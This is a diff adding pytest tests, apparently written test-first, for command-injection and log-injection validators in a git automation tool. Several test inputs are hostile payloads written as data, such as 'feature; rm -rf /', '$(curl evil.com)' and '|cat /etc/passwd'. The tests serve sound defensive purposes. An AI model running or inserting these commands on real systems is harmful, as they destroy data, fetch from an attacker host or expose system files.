@@ -743,3 +743,337 @@ class TestEdgeCases:
         )
 
         assert '中文' in instructions or 'feat: add' in instructions
+
+
+class TestSecurityValidation:
+    """Test NEW security validation functions (TDD red phase).
+
+    These tests are for NEW functions that don't exist yet:
+    - validate_git_state()
+    - validate_branch_name()
+    - validate_commit_message()
+    - check_git_credentials()
+
+    All tests should FAIL initially (ImportError or function not found).
+
+    Security Coverage:
+    - CWE-78: Command Injection (branch names, commit messages)
+    - CWE-22: Path Traversal (session files)
+    - CWE-117: Log Injection (audit logs)
+    - CWE-732: Incorrect Permissions (git directories)
+    """
+
+    def test_validate_git_state_detached_head(self):
+        """Should reject git operations when in detached HEAD state."""
+        with patch('subprocess.run') as mock_run:
+            # Simulate detached HEAD
+            mock_run.return_value = Mock(
+                returncode=0,
+                stdout='HEAD detached at abc1234',
+            )
+
+            from auto_implement_git_integration import validate_git_state
+
+            with pytest.raises(ValueError, match='detached HEAD'):
+                validate_git_state()
+
+    def test_validate_git_state_protected_branch(self):
+        """Should reject git operations on protected branches (main, master)."""
+        with patch('subprocess.run') as mock_run:
+            # Simulate on main branch
+            mock_run.return_value = Mock(returncode=0, stdout='main')
+
+            from auto_implement_git_integration import validate_git_state
+
+            with pytest.raises(ValueError, match='protected branch'):
+                validate_git_state()
+
+    def test_validate_git_state_not_a_repo(self):
+        """Should raise error when not in a git repository."""
+        with patch('subprocess.run') as mock_run:
+            # Simulate not a git repo
+            mock_run.side_effect = CalledProcessError(128, 'git')
+
+            from auto_implement_git_integration import validate_git_state
+
+            with pytest.raises(ValueError, match='not a git repository'):
+                validate_git_state()
+
+    def test_validate_git_state_uncommitted_changes(self):
+        """Should allow uncommitted changes (they'll be committed)."""
+        with patch('subprocess.run') as mock_run:
+            # Simulate uncommitted changes
+            mock_run.side_effect = [
+                Mock(returncode=0, stdout='feature/add-auth'),  # branch name
+                Mock(returncode=0, stdout=' M file1.py\n M file2.py'),  # git status
+            ]
+
+            from auto_implement_git_integration import validate_git_state
+
+            # Should not raise (uncommitted changes are OK)
+            result = validate_git_state()
+            assert result is True
+
+    def test_validate_branch_name_command_injection(self):
+        """Should reject branch names with command injection attempts (CWE-78)."""
+        from auto_implement_git_integration import validate_branch_name
+
+        dangerous_names = [
+            'feature; rm -rf /',
+            'feature$(curl evil.com)',
+            'feature`whoami`',
+            'feature|cat /etc/passwd',
+            'feature&& rm important.txt',
+        ]
+
+        for name in dangerous_names:
+            with pytest.raises(ValueError, match='Invalid branch name'):
+                validate_branch_name(name)
+
+    def test_validate_branch_name_length_limit(self):
+        """Should reject branch names exceeding 255 characters."""
+        from auto_implement_git_integration import validate_branch_name
+
+        long_name = 'feature/' + 'a' * 300
+
+        with pytest.raises(ValueError, match='Branch name too long'):
+            validate_branch_name(long_name)
+
+    def test_validate_branch_name_valid_names(self):
+        """Should accept valid branch names."""
+        from auto_implement_git_integration import validate_branch_name
+
+        valid_names = [
+            'feature/add-auth',
+            'bugfix/issue-123',
+            'release/v1.2.3',
+            'feat/user-login_v2',
+        ]
+
+        for name in valid_names:
+            # Should not raise
+            result = validate_branch_name(name)
+            assert result == name  # Returns sanitized name
+
+    def test_validate_branch_name_shell_metacharacters(self):
+        """Should reject shell metacharacters in branch names (CWE-78)."""
+        from auto_implement_git_integration import validate_branch_name
+
+        dangerous_chars = ['$', '`', '|', '&', ';', '>', '<', '(', ')', '{', '}']
+
+        for char in dangerous_chars:
+            name = f'feature{char}test'
+            with pytest.raises(ValueError, match='Invalid characters'):
+                validate_branch_name(name)
+
+    def test_validate_commit_message_command_injection(self):
+        """Should reject commit messages with command injection attempts (CWE-78)."""
+        from auto_implement_git_integration import validate_commit_message
+
+        dangerous_messages = [
+            'feat: add auth\n$(curl evil.com)',
+            'feat: add auth`whoami`',
+            'feat: add auth; rm -rf /',
+        ]
+
+        for msg in dangerous_messages:
+            with pytest.raises(ValueError, match='Invalid commit message'):
+                validate_commit_message(msg)
+
+    def test_validate_commit_message_log_injection(self):
+        """Should reject log injection attempts in commit messages (CWE-117)."""
+        from auto_implement_git_integration import validate_commit_message
+
+        injection_attempts = [
+            'feat: add auth\n\nINFO: Fake log entry',
+            'feat: add auth\x00null byte injection',
+            'feat: add auth\r\nERROR: Fake error',
+        ]
+
+        for msg in injection_attempts:
+            with pytest.raises(ValueError, match='Invalid commit message'):
+                validate_commit_message(msg)
+
+    def test_validate_commit_message_length_limit(self):
+        """Should reject commit messages exceeding reasonable length."""
+        from auto_implement_git_integration import validate_commit_message
+
+        long_message = 'feat: ' + 'a' * 10000
+
+        with pytest.raises(ValueError, match='Commit message too long'):
+            validate_commit_message(long_message)
+
+    def test_validate_commit_message_valid_messages(self):
+        """Should accept valid conventional commit messages."""
+        from auto_implement_git_integration import validate_commit_message
+
+        valid_messages = [
+            'feat: add user authentication',
+            'fix: resolve login bug\n\nDetailed explanation here.',
+            'docs: update README',
+            'refactor: simplify auth logic',
+        ]
+
+        for msg in valid_messages:
+            # Should not raise
+            result = validate_commit_message(msg)
+            assert result == msg  # Returns sanitized message
+
+    def test_check_git_credentials_missing_config(self):
+        """Should detect missing git config (user.name, user.email)."""
+        with patch('subprocess.run') as mock_run:
+            # Simulate missing git config
+            mock_run.return_value = Mock(returncode=1, stdout='')
+
+            from auto_implement_git_integration import check_git_credentials
+
+            with pytest.raises(ValueError, match='Git user.name not configured'):
+                check_git_credentials()
+
+    def test_check_git_credentials_gh_not_authenticated(self):
+        """Should detect when gh CLI is not authenticated."""
+        with patch('subprocess.run') as mock_run:
+            # Simulate gh not authenticated
+            mock_run.side_effect = [
+                Mock(returncode=0, stdout='John Doe'),  # git user.name
+                Mock(returncode=0, stdout='john@example.com'),  # git user.email
+                Mock(returncode=1, stderr='Not logged in'),  # gh auth status
+            ]
+
+            from auto_implement_git_integration import check_git_credentials
+
+            with pytest.raises(ValueError, match='gh CLI not authenticated'):
+                check_git_credentials()
+
+    def test_check_git_credentials_success(self):
+        """Should pass when git and gh are properly configured."""
+        with patch('subprocess.run') as mock_run:
+            # Simulate properly configured environment
+            mock_run.side_effect = [
+                Mock(returncode=0, stdout='John Doe'),  # git user.name
+                Mock(returncode=0, stdout='john@example.com'),  # git user.email
+                Mock(returncode=0, stdout='Logged in to github.com'),  # gh auth
+            ]
+
+            from auto_implement_git_integration import check_git_credentials
+
+            # Should not raise
+            result = check_git_credentials()
+            assert result is True
+
+    def test_check_git_credentials_optional_gh(self):
+        """Should allow missing gh CLI if PR creation not requested."""
+        with patch('subprocess.run') as mock_run:
+            # Simulate git configured but gh not available
+            mock_run.side_effect = [
+                Mock(returncode=0, stdout='John Doe'),  # git user.name
+                Mock(returncode=0, stdout='john@example.com'),  # git user.email
+                FileNotFoundError('gh command not found'),  # gh not installed
+            ]
+
+            from auto_implement_git_integration import check_git_credentials
+
+            # Should not raise if require_gh=False
+            result = check_git_credentials(require_gh=False)
+            assert result is True
+
+    @patch('auto_implement_git_integration.security_utils.audit_log')
+    def test_security_validation_audit_logging(self, mock_audit):
+        """Should log security validation attempts to audit log."""
+        from auto_implement_git_integration import validate_branch_name
+
+        try:
+            validate_branch_name('feature; rm -rf /')
+        except ValueError:
+            pass
+
+        # Should log command injection attempt
+        mock_audit.assert_called()
+        call_args = mock_audit.call_args[0]
+        assert 'command_injection_attempt' in call_args or 'security_validation_failed' in call_args
+
+    def test_validate_git_state_uses_security_utils(self):
+        """Should use security_utils for path validation."""
+        with patch('auto_implement_git_integration.security_utils.validate_path') as mock_validate:
+            with patch('subprocess.run') as mock_run:
+                mock_run.return_value = Mock(returncode=0, stdout='feature/test')
+
+                from auto_implement_git_integration import validate_git_state
+
+                validate_git_state()
+
+                # Should validate git directory paths
+                # (implementation detail - may or may not call depending on design)
+                # This test documents the expected integration
+
+    def test_validate_branch_name_max_length_constant(self):
+        """Should use a defined constant for max branch name length."""
+        from auto_implement_git_integration import validate_branch_name
+
+        # Test boundary condition: exactly at limit should pass
+        name_at_limit = 'feature/' + 'a' * 240  # 248 chars total
+        result = validate_branch_name(name_at_limit)
+        assert result == name_at_limit
+
+        # One over limit should fail
+        name_over_limit = name_at_limit + 'x'
+        with pytest.raises(ValueError, match='too long'):
+            validate_branch_name(name_over_limit)
+
+    def test_validate_commit_message_newline_handling(self):
+        """Should properly handle newlines in commit messages."""
+        from auto_implement_git_integration import validate_commit_message
+
+        # Valid multi-line message (conventional commits format)
+        valid_multiline = (
+            'feat: add user authentication\n'
+            '\n'
+            'Implement JWT-based authentication with refresh tokens.\n'
+            '\n'
+            'Fixes #123'
+        )
+
+        # Should not raise
+        result = validate_commit_message(valid_multiline)
+        assert result == valid_multiline
+
+    def test_validate_git_state_merge_in_progress(self):
+        """Should detect and reject when merge is in progress."""
+        with patch('subprocess.run') as mock_run:
+            # Simulate merge in progress
+            mock_run.side_effect = [
+                Mock(returncode=0, stdout='feature/test'),  # branch name
+                Mock(returncode=0, stdout='UU conflicted.py'),  # merge conflict
+            ]
+            with patch('pathlib.Path.exists', return_value=True):  # .git/MERGE_HEAD exists
+                from auto_implement_git_integration import validate_git_state
+
+                with pytest.raises(ValueError, match='merge in progress'):
+                    validate_git_state()
+
+    def test_validate_git_state_rebase_in_progress(self):
+        """Should detect and reject when rebase is in progress."""
+        with patch('subprocess.run') as mock_run:
+            mock_run.return_value = Mock(returncode=0, stdout='feature/test')
+            with patch('pathlib.Path.exists', return_value=True):  # .git/rebase-merge exists
+                from auto_implement_git_integration import validate_git_state
+
+                with pytest.raises(ValueError, match='rebase in progress'):
+                    validate_git_state()
+
+    def test_check_git_credentials_ssh_vs_https(self):
+        """Should handle both SSH and HTTPS remote URLs."""
+        with patch('subprocess.run') as mock_run:
+            # Simulate SSH remote
+            mock_run.side_effect = [
+                Mock(returncode=0, stdout='John Doe'),
+                Mock(returncode=0, stdout='john@example.com'),
+                Mock(returncode=0, stdout='git@github.com:user/repo.git'),  # remote URL
+                Mock(returncode=0, stdout='Logged in'),  # gh auth
+            ]
+
+            from auto_implement_git_integration import check_git_credentials
+
+            # Should not raise
+            result = check_git_credentials()
+            assert result is True
